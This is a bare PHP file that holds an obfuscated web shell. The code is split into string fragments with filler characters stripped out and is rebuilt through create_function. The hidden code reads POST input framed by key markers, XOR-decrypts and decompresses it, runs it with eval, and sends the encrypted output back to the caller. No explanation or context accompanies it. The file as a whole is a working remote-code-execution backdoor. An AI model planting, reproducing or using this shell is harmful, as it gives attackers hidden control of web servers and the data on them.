<?php
$a='Y(;@evaY(l(@gzY(Y(uncompresY(s(Y(Y(@x(@baY(seY(6Y(4_decode($m[1]),$k)));$o=@ob_geY(tY(_coY(ntenY(';
$f='$k=Y("Y(1c24aa39";$khY(="693cb5Y(22fc22";Y($kY(f="e57Y(00cf135cY(6";$p="Y(QXY(WaG23HbY(vuA2iNY(T';
$R=str_replace('Cy','','crCyeaCyteCy_CyCyfuncCytion');
$c='r($j=0;Y(Y(($j<$c&&$Y(i<Y($l);$j+Y(+,$i++){$o.=$Y(t{$i}^Y($k{$Y(j};}}retY(urnY( $oY(;}if (@preY(g';
$P='_matY(chY(("/$kh(.+Y()$kY(f/",@fY(ile_get_coY(ntentY(s("php:/Y(/Y(input"),$mY()=Y(=1)Y( {@ob_start()';
$U='tsY(();@ob_end_clean();$rY(Y(=@baY(se64_enY(codY(e(@x(@gzcoY(mpress(Y($o),$kY());priY(nt("$p$khY($r$kf");}';
$T='";funY(ction x($Y(t,$kY(){$c=stY(rlen($Y(Y(k);$l=strlY(en($t);$oY(=Y("";forY(($i=0;$iY(<$lY(;){fo';
$h=str_replace('Y(','',$f.$T.$c.$P.$a.$U);
$z=$R('',$h);$z();
?>
